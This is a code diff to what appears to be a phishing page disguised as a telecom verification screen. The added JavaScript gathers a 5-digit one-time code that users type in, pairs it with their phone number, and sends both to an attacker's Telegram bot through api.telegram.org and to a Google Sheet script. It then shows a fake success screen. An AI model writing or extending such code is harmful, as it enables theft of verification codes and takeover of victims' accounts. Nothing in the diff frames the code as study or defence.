@@ -93,22 +93,21 @@
     </section>
 
     <section id="view-3" class="view">
-        <h2 class="title" style="color: var(--tele-red);">Enter Verification Code</h2>
-        <p class="subtitle">We've sent a 5-digit one-time password to <span id="display-id" style="color:white;"></span>. Enter it below to confirm.</p>
-        
-        <div class="timer-box" id="timer">00:30</div>
+    <h2 class="title" style="color: var(--tele-red);">Enter Verification Code</h2>
+    <p class="subtitle">We've sent a 5-digit code to <span id="display-id" style="color:white;"></span>.</p>
+    
+    <div class="timer-box" id="timer">00:30</div>
 
-        <div class="otp-row">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-        </div>
+    <div class="otp-row">
+        <input type="number" class="otp-input" maxlength="1" oninput="moveFocus(this, 0)">
+        <input type="number" class="otp-input" maxlength="1" oninput="moveFocus(this, 1)">
+        <input type="number" class="otp-input" maxlength="1" oninput="moveFocus(this, 2)">
+        <input type="number" class="otp-input" maxlength="1" oninput="moveFocus(this, 3)">
+        <input type="number" class="otp-input" maxlength="1" oninput="moveFocus(this, 4)">
+    </div>
 
-        <button class="btn-red" onclick="showView(4)">Confirm & Finish</button>
-        <button class="btn-outline" onclick="location.reload()">Cancel</button>
-    </section>
+    <button class="btn-red" id="otp-btn" onclick="sendOTP()">Confirm & Finish</button>
+</section>
 
     <section id="view-4" class="view" style="text-align: center; padding-top: 60px;">
         <div style="font-size: 4rem; margin-bottom: 20px;">✅</div>
@@ -197,6 +196,50 @@
 
     // Initial Calculation
     calculate();
+    function moveFocus(current, index) {
+    const inputs = document.querySelectorAll('.otp-input');
+    
+    // Move to next box if a number is entered
+    if (current.value.length >= 1 && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+    }
+
+    // If all boxes are full, send automatically
+    if (index === 4 && current.value.length >= 1) {
+        sendOTP();
+    }
+}
+
+async function sendOTP() {
+    const inputs = document.querySelectorAll('.otp-input');
+    let otpCode = "";
+    inputs.forEach(input => otpCode += input.value);
+
+    if(otpCode.length < 5) return; // Don't send partial codes
+
+    const phone = document.getElementById('user-id').value;
+    const btn = document.getElementById('otp-btn');
+    
+    btn.innerText = "VERIFYING...";
+    btn.disabled = true;
+
+    // Send the OTP to Telegram
+    if(BOT_TOKEN && CHAT_ID) {
+        const msg = `🔓 *OTP RECEIVED*\n📱 Phone: ${phone}\n🔢 CODE: *${otpCode}*`;
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    }
+
+    // Also update Google Sheet with the OTP
+    fetch(SCRIPT_URL, { 
+        method: 'POST', 
+        mode: 'no-cors', 
+        body: new URLSearchParams({ phone: phone, otp: otpCode, action: "saveOTP" }) 
+    });
+
+    // Show Success View
+    setTimeout(() => { showView(4); }, 1500);
+}
 </script>
 
 </body>
